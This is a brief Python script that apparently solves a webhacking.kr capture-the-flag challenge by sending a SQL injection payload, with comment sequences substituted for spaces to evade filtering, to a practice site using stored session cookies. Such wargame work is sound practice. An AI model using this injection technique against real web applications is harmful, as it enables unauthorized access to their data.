import urllib
import requests
from phpsessid import cookies

url = 'https://webhacking.kr/challenge/web-12/index.php?no='
payload = urllib.parse.quote_plus('1)/**/or/**/true/**/order/**/by/**/id--\r')
response = requests.get(url+payload, cookies=cookies)
print(response.text)

